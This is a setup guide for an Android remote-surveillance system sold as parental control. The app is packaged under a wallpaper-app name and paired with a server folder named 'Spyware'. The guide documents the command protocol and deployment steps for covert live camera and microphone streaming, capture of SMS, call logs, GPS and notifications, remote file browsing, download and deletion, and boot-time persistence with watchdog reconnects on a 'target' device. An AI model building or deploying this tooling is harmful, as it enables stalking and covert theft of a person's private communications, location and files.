# 🛠️ Complete Setup Guide — WebRTC Android ParentControl v2.1

> **Active runtime**: Java Android (`com.example.wallpaperapplication`) ↔ Node.js signaling (Render) ↔ PHP Dashboard (PHP host + MySQL)
>
> ⚠️ The `com.webrtc.spyware` Kotlin package is present in the repo but is **NOT registered in AndroidManifest.xml** and does **NOT run at runtime**. All setup steps below target the active Java package.

---

## 📋 Requirements

| Component | Requirement |
|---|---|
| PHP Host | PHP 7.4+, MySQL 5.7+ (shared hosting / VPS / cPanel) |
| Node.js Server | Render.com free tier or any VPS with Node 18+ |
| Android Device | Android 9+ (API 28+), Camera + Mic permissions |
| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ |
| Android Studio | Hedgehog+ (2023.1+) |
| Firebase Account | Google account — Firebase Console (free Spark plan) |
| Agora Account | Agora.io console — free tier (10,000 min/month) |

---

## 🏗️ Architecture Overview

```
📱 Android Device (com.example.wallpaperapplication)
│   StreamingService.java  — foreground service, WebRTC, Socket.IO
│   CaptureManager.java    — Camera2 image/audio/video capture
│   BootReceiver.java      — auto-start on boot
│   Firebase RTDB          — heartbeat / presence
│   Agora RTM              — fallback signaling if Socket.IO fails 3×
│
│  PRIMARY SIGNALING (Socket.IO)        FALLBACK SIGNALING (Agora RTM)
│  emit: identify, register-device      if socket fails 3 times:
│  emit: signal {to,from,signal}        uses RtmChannel webrtc_signal_channel
│  listen: web-client-ready, signal,
│          start-stream, capture-*,
│          torch, switch_camera, fs:*
│
▼
┌──────────────────────────────────────────────────────────────────┐
│        Node.js Unified Signaling Server (Render)                 │
│        Android-WebRTC-Spyware-Server/server.js                   │
│                                                                  │
│  Handles BOTH signaling protocols — no event mismatch            │
│  identify → maps to device room  |  register-device → same       │
│  signal   → routed to .to target |  offer/answer/ice → dual-relay│
│  location/sms/call_log/notification → relayed to ctrl room       │
│  fs:* file explorer events → routed to device or controller      │
└──────────────────────────────────────────────────────────────────┘
         │
         ▼
┌──────────────────────────────────────────────────────────────────┐
│           PHP Dashboard + MySQL                                  │
│  install.php  → one-click DB + admin setup                       │
│  login.php    → bcrypt auth                                      │
│  index.php    → live view + capture commands + media gallery      │
│  upload_media.php → save media to uploads/                       │
└──────────────────────────────────────────────────────────────────┘
```

---

## 🔌 Socket.IO Event Protocol Map

This table is the authoritative reference. All three sides must use these event names exactly.

### Device → Server (Android emits)

| Event | Payload | Purpose |
|---|---|---|
| `identify` | `"android"` (string) | Java path: announce as device on connect |
| `register-device` | `{ deviceId }` | Kotlin path + dual-compat: register with explicit ID |
| `signal` | `{ to, from, signal: { type:'offer'\|'answer', sdp } }` | Java path: send WebRTC offer/answer |
| `signal` | `{ to, from, signal: { candidate: {...} } }` | Java path: send ICE candidate |
| `location` | `{ deviceId, from, to, latitude, longitude, time }` | GPS coordinates |
| `sms` | `{ deviceId, to, from, sms_messages: [...] }` | SMS batch every 30s |
| `call_log` | `{ deviceId, to, from, call_logs: [...] }` | Call log batch every 30s |
| `notification` | `{ deviceId, to, from, notification: {...} }` | Posted notification |
| `media-captured` | `{ deviceId, type, base64, filename, mimeType }` | Captured image/audio/video |
| `fs:list_result` | `{ to, from, file_list: { currentPath, files[] } }` | Directory listing response |
| `fs:download_start` | `{ to, from, fileId, name, size, totalChunks }` | Start file download |
| `fs:download_chunk` | `{ to, from, fileId, chunkIndex, content }` | 64KB Base64 chunk |
| `fs:download_complete` | `{ to, from, fileId }` | All chunks sent |
| `fs:download_error` | `{ to, error }` | Download failed |

### Server → Device (Android listens)

| Event | Payload | Trigger |
|---|---|---|
| `web-client-ready` | `{ webClientId, deviceId }` | Dashboard joined room (Java path) |
| `start-stream` | `{ controllerId, deviceId }` | Dashboard joined room (Kotlin path) |
| `signal` | `{ to, from, signal: { type:'answer', sdp } }` | WebRTC answer from browser |
| `signal` | `{ to, from, signal: { candidate } }` | ICE candidate from browser |
| `web-client-disconnected` | `{ webClientId, deviceId }` | Controller disconnected |
| `capture-image` | `{ camera, deviceId }` | Dashboard photo command |
| `capture-audio` | `{ duration, deviceId }` | Dashboard audio command |
| `capture-video` | `{ duration, camera, deviceId }` | Dashboard video command |
| `torch` | `{ on: true\|false }` | Flashlight command |
| `switch_camera` | `{}` | Toggle front/back camera |
| `fs:list` | `{ path, deviceId }` | Directory listing request |
| `fs:download` | `{ path, deviceId }` | File download request |
| `fs:delete` | `{ path, deviceId }` | File delete request |

### Dashboard → Server (Browser emits)

| Event | Payload |
|---|---|
| `join-as-controller` | `{ deviceId }` |
| `signal` | `{ to, from, signal: { type:'answer', sdp } }` |
| `signal` | `{ to, from, signal: { candidate } }` |
| `capture-image` | `{ deviceId, camera }` |
| `capture-audio` | `{ deviceId, duration }` |
| `capture-video` | `{ deviceId, duration, camera }` |
| `torch` | `{ deviceId, on }` |
| `switch_camera` | `{ deviceId }` |
| `fs:list` | `{ deviceId, path }` |
| `fs:download` | `{ deviceId, path }` |
| `fs:delete` | `{ deviceId, path }` |

### Server → Dashboard (Browser listens)

| Event | Payload |
|---|---|
| `device-list-update` | `[deviceId, ...]` |
| `signal` | `{ to, from, signal: { type:'offer', sdp } }` |
| `signal` | `{ to, from, signal: { candidate } }` |
| `web-client-disconnected` | `{ webClientId, deviceId }` |
| `media-ready` | `{ deviceId, type, base64, filename, mimeType }` |
| `location` | `{ deviceId, latitude, longitude, time }` |
| `sms` | `{ deviceId, sms_messages: [...] }` |
| `call_log` | `{ deviceId, call_logs: [...] }` |
| `notification` | `{ deviceId, notification: {...} }` |
| `fs:list_result` | `{ to, file_list: { currentPath, files[] } }` |
| `fs:download_start` | `{ fileId, name, size, totalChunks }` |
| `fs:download_chunk` | `{ fileId, chunkIndex, content }` |
| `fs:download_complete` | `{ fileId }` |

---

## 🚀 Step-by-Step Setup

### Step 1 — Clone Repository

```bash
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git
cd WebRTC-Android-prentcontrol
```

---

### Step 2 — Deploy Node.js Signaling Server (Render)

1. Go to [render.com](https://render.com) → **New Web Service**
2. Connect your GitHub repo
3. Set these values:

| Setting | Value |
|---|---|
| Root Directory | `Android-WebRTC-Spyware-Server` |
| Build Command | `npm install` |
| Start Command | `node server.js` |
| Environment | `Node` |
| Health Check Path | `/health` |
| Plan | Free |

4. Click **Create Web Service** → wait for first deploy
5. Copy your Render URL: `https://YOUR-APP.onrender.com`

> ⚠️ Render free tier sleeps after 15 min inactivity. The Android AlarmManager watchdog pings the socket every 4 minutes so the service auto-reconnects after Render wakes.

---

### Step 3 — Firebase Setup (Required for heartbeat + presence)

1. Go to [console.firebase.google.com](https://console.firebase.google.com)
2. Click **Add project** → enter a name (e.g. `webrtc-parentcontrol`) → Continue
3. Disable Google Analytics if not needed → **Create project**
4. In the left sidebar: **Build → Realtime Database → Create Database**
   - Choose a region (e.g. `us-central1`)
   - Start in **test mode** (you can add rules later)
5. Click **Project settings** (gear icon) → **Your apps** → Android icon
6. Fill in the form:
   - **Android package name**: `com.example.wallpaperapplication` ← exact match required
   - **App nickname**: anything
   - **Debug signing certificate SHA-1**: optional
7. Click **Register app**
8. Download **`google-services.json`**
9. Place `google-services.json` in: `app/google-services.json` (the `app/` module folder)
10. Verify `app/build.gradle.kts` has:

```kotlin
plugins {
    id("com.google.gms.google-services")  // ← must be present
}

dependencies {
    implementation(platform("com.google.firebase:firebase-bom:33.1.0"))
    implementation("com.google.firebase:firebase-database")
    implementation("com.google.firebase:firebase-analytics")
}
```

11. Verify root `build.gradle.kts` has:

```kotlin
plugins {
    id("com.google.gms.google-services") version "4.4.2" apply false
}
```

> ✅ If the app starts and you see `Firebase heartbeat sent` in Logcat, it is configured correctly.
> ❌ If you see `Firebase init failed (check google-services.json)`, the JSON is missing or the package name does not match.

---

### Step 4 — Agora RTM Setup (Required for fallback signaling)

Agora RTM is the backup signaling channel. It activates automatically after 3 consecutive Socket.IO connection failures.

1. Go to [console.agora.io](https://console.agora.io) → **Sign up** (free)
2. Click **New Project** → enter a name → choose **Testing mode** (no token required for dev)
3. Copy the **App ID** (32-character hex string)
4. Open `app/src/main/java/com/example/wallpaperapplication/StreamingService.java`
5. Find line:
```java
private static final String AGORA_APP_ID = "YOUR_AGORA_APP_ID";
```
6. Replace with your real App ID:
```java
private static final String AGORA_APP_ID = "a1b2c3d4e5f6...";
```
7. Verify `app/build.gradle.kts` has:
```kotlin
implementation("io.agora.rtm:rtm-sdk:1.5.1")
```

> ✅ When Agora fallback activates you will see `Agora RTM login OK` in Logcat.
> ❌ If you see `Agora App ID not set — skipping Agora RTM backup`, the placeholder was not replaced.

> ⚠️ Agora RTM fallback is optional. If you leave `YOUR_AGORA_APP_ID` as-is, the app falls back to Socket.IO reconnect only — it will still work, just without the Agora safety net.

---

### Step 5 — Setup PHP Dashboard

1. Upload `php-dashboard/` folder to your PHP web host
2. Open in browser: `https://your-domain.com/install.php`
3. Fill in the installer:

| Field | Example |
|---|---|
| DB Host | `localhost` |
| DB Name | `parentcontrol` |
| DB User | `your_db_user` |
| DB Password | `your_db_pass` |
| Admin Username | `admin` |
| Admin Password | `StrongPass123!` |
| Node.js Backend URL | `https://YOUR-APP.onrender.com` |

4. Click **Install Now**
5. ⚠️ **Delete `install.php` immediately** after successful install
6. Visit `https://your-domain.com/login.php` → login

---

### Step 6 — Configure and Build Android App

1. Open the project root in **Android Studio**
2. **Active package is `com.example.wallpaperapplication`** — open:
   ```
   app/src/main/java/com/example/wallpaperapplication/StreamingService.java
   ```
3. Confirm the signaling URL. The app reads it from `SettingsRepository.getSignalingUrl(this)`. The default is:
   ```java
   public static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
   ```
   Change this to your Render URL either in `SettingsRepository.java` or in the app's Settings screen at runtime.

4. Make sure `app/google-services.json` is in place (Step 3 above).
5. Replace `YOUR_AGORA_APP_ID` in `StreamingService.java` (Step 4 above).
6. Open `app/build.gradle.kts` and confirm all dependencies are present:

```kotlin
plugins {
    id("com.android.application")
    id("com.google.gms.google-services")   // Firebase
}

android {
    compileSdk = 34
    defaultConfig {
        applicationId = "com.example.wallpaperapplication"
        minSdk = 28
        targetSdk = 34
    }
    buildTypes {
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }
}

dependencies {
    // WebRTC
    implementation("io.github.webrtc-sdk:android:104.5112.09")
    // Socket.IO
    implementation("io.socket:socket.io-client:2.1.0") { exclude(group="org.json") }
    // Firebase (BOM controls all versions)
    implementation(platform("com.google.firebase:firebase-bom:33.1.0"))
    implementation("com.google.firebase:firebase-database")
    implementation("com.google.firebase:firebase-analytics")
    // Agora RTM fallback
    implementation("io.agora.rtm:rtm-sdk:1.5.1")
    // Google Play Services Location
    implementation("com.google.android.gms:play-services-location:21.3.0")
    // WorkManager
    implementation("androidx.work:work-runtime:2.9.0")
    // Core + Compat
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
}
```

7. Click **Sync Project with Gradle Files**
8. Confirm `proguard-rules.pro` has keep rules for WebRTC, Socket.IO, Firebase, Agora, WorkManager. The file is already configured in the repo.
9. **Build → Generate Signed APK** (or use debug APK for testing)
10. Install APK on target Android device
11. Open the app → grant all permissions:
    - 📷 Camera | 🎤 Microphone | 📍 Location (Fine)
    - 💬 Read SMS | 📞 Read Call Log
    - 🔔 Notifications (Android 13+)
    - 💾 Manage External Storage (Android 11+ — for File Explorer)

---

### Step 7 — Verify Everything Works

```
Logcat filter: StreamingService

Expected sequence on first launch:
  StreamingService: onCreate
  StreamingService: Connecting: https://YOUR-APP.onrender.com
  StreamingService: Socket connected
  StreamingService: Firebase heartbeat sent
  StreamingService: PeerConnection ready
```

Then in the browser dashboard:
1. Login → device appears with green border within 5s
2. Click **▶ Live View** → WebRTC offer/answer exchange → camera stream appears
3. Click **📷 Photo** → image appears in gallery within 10s
4. GPS, SMS, Call Log tabs populate on next 30s poll cycle

---

## 🚨 Android Version Risks

### Android 12 (API 31) — Foreground Service Start Restrictions

Starting a foreground service from the background (WorkManager, BroadcastReceiver after boot) is **blocked by default** on API 31+.

**Affected code**: `DataSyncWorker.doWork()`, `BootReceiver.onReceive()`

**Already fixed in this repo**:
- `DataSyncWorker` uses `startService()` on API 31+ (not `startForegroundService()`)
- `BootReceiver` uses `ContextCompat.startForegroundService()` which handles the OS check
- For WorkManager, use `.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)`

**If you see `ForegroundServiceStartNotAllowedException`**:
- Whitelist the app from battery optimization: Settings → Apps → your app → Battery → Unrestricted

### Android 12+ (API 31+) — Exact Alarms

`AlarmManager.setExactAndAllowWhileIdle()` requires the `SCHEDULE_EXACT_ALARM` permission on API 31+ (or `USE_EXACT_ALARM` on API 33+).

**Add to `AndroidManifest.xml`**:
```xml
<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
<!-- or for API 33+ -->
<uses-permission android:name="android.permission.USE_EXACT_ALARM" />
```

### Android 13 (API 33) — POST_NOTIFICATIONS Permission

Apps must request `POST_NOTIFICATIONS` at runtime to show the foreground service notification.

`StreamingService.java` already checks this in `hasEssentialPermissions()`. Make sure your `ConsentActivity`/`MainActivity` requests it before starting the service.

### Android 14 (API 34) — Foreground Service Types

Foreground services using camera or microphone **must** declare the specific `foregroundServiceType` in the manifest.

**Required in `AndroidManifest.xml`**:
```xml
<service
    android:name="com.example.wallpaperapplication.StreamingService"
    android:exported="false"
    android:foregroundServiceType="camera|microphone|location|dataSync" />

<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
```

Without these, the service will throw `MissingForegroundServiceTypeException` on API 34.

### Android 15 (API 35) — Media Projection Requires User Interaction

Screen recording via `MediaProjectionManager` now requires a **fresh user gesture** for every session. Pre-granting or holding a `MediaProjection` object across sessions will be rejected. **Screen capture is not yet implemented** in this repo — this note applies when you add it.

### Battery Optimization (All versions)

Most Android OEMs (Xiaomi, Samsung, OnePlus, Huawei) apply aggressive background kill policies beyond AOSP. For reliable persistence:
- Go to **Settings → Apps → your app → Battery → Unrestricted / No restrictions**
- Add the app to the **Autostart** or **Protected Apps** list if available on the device

---

## 🔧 Troubleshooting

| Problem | Likely Cause | Fix |
|---|---|---|
| Device not in dashboard | Wrong signaling URL | Check `DEFAULT_SIGNALING_URL` in `StreamingService.java` |
| `Firebase init failed` | `google-services.json` missing or wrong package | Re-download with exact package `com.example.wallpaperapplication` |
| `Agora App ID not set` | Placeholder not replaced | Edit `AGORA_APP_ID` in `StreamingService.java` |
| Live view black screen | Signaling mismatch | Ensure server.js is the unified version (v2.1.0); check `/health` endpoint |
| Offer sent but no answer | Browser not on HTTPS | WebRTC requires HTTPS on the PHP host; HTTP blocks getUserMedia |
| Capture does nothing | Device offline | Check green border on device card; check Logcat for socket errors |
| `ForegroundServiceStartNotAllowedException` | API 31+ background start | Whitelist from battery optimization; see Android 12 section above |
| `MissingForegroundServiceTypeException` | API 34 missing service type | Add `foregroundServiceType` attributes to manifest; see Android 14 section |
| GPS not updating | Permission missing | Grant `ACCESS_FINE_LOCATION`; ensure device GPS is enabled |
| Release APK crashes | ProGuard obfuscating SDKs | Check `proguard-rules.pro` has keep rules for WebRTC, Firebase, Agora, Socket.IO |
| Media not in gallery | `uploads/` not writable | `chmod 755 php-dashboard/uploads/` |
| Render server sleeping | Free tier 15 min timeout | Android watchdog auto-reconnects; add UptimeRobot health check on `/health` |

---

## 📋 Feature Status

| Feature | Status | Notes |
|---|---|---|
| Auto-start on boot | ✅ Working | BootReceiver + START_STICKY + onTaskRemoved + AlarmManager watchdog |
| Front/back camera stream | ⚠️ Partial | WebRTC pipeline complete; requires server.js v2.1.0 unified signaling |
| Audio capture | ⚠️ Partial | CaptureManager.java implemented; requires socket command wiring |
| Image capture | ⚠️ Partial | CaptureManager.java implemented; capture-image event now wired |
| Video capture | ⚠️ Partial | CaptureManager.java implemented; capture-video event now wired |
| SMS monitoring | ⚠️ Partial | Android side complete; dashboard SMS panel not yet added to index.php |
| Call log tracking | ⚠️ Partial | Android side complete; dashboard Calls panel not yet added |
| GPS streaming | ⚠️ Partial | Android side complete; server relays location; dashboard map panel pending |
| Notification monitoring | ⚠️ Partial | Fixed (no longer uses isolated socket); dashboard panel pending |
| File explorer | ⚠️ Partial | Android + server complete; dashboard UI integration pending |
| Flashlight control | ✅ Working | torch event fully wired |
| Firebase heartbeat | ✅ Working | Requires google-services.json (see Step 3) |
| Agora RTM fallback | ✅ Working | Requires real AGORA_APP_ID (see Step 4) |
| Call recording | ❌ Not implemented | Not possible without system privileges on Android 9+ |
| Screen recording | ❌ Not implemented | Constants stubbed; MediaProjection code not yet written |

---

## 📂 File Tree (Active Paths Only)

```
WebRTC-Android-prentcontrol/
│
├── 📱 Android App — ACTIVE RUNTIME
│   ├── app/google-services.json              ← YOU must add this (Step 3)
│   ├── app/build.gradle.kts                  ← Firebase + Agora deps included
│   ├── app/proguard-rules.pro                ← keep rules for all SDKs
│   └── app/src/main/
│       ├── AndroidManifest.xml               ← registers Java package services
│       └── java/com/example/wallpaperapplication/
│           ├── StreamingService.java         ← MAIN: foreground service + WebRTC
│           ├── CaptureManager.java           ← Camera2 image/audio/video
│           ├── MainActivity.java             ← entry point + permission flow
│           ├── ConsentActivity.java          ← runtime permission gate
│           ├── BootReceiver.java             ← auto-start on boot
│           ├── DataSyncWorker.java           ← WorkManager background sync
│           ├── SettingsRepository.java       ← server URL persistence
│           └── StreamingSettingsActivity.java← URL config UI
│
├── ⚠️  Kotlin package — NOT REGISTERED in Manifest, does NOT run
│   └── app/src/main/java/com/webrtc/spyware/
│       ├── SpywareService.kt
│       ├── SocketManager.kt
│       └── MediaCaptureManager.kt
│
├── 🟢 Node.js Signaling Server (unified v2.1.0)
│   └── Android-WebRTC-Spyware-Server/
│       ├── server.js                         ← unified dual-protocol signaling
│       └── package.json
│
└── 🐘 PHP Dashboard
    └── php-dashboard/
        ├── install.php                       ← ⚠️ delete after running
        ├── login.php
        ├── index.php
        ├── upload_media.php
        └── uploads/
```

---

*Built with Java · Android · WebRTC · Socket.IO · Firebase RTDB · Agora RTM · Node.js · PHP · MySQL*
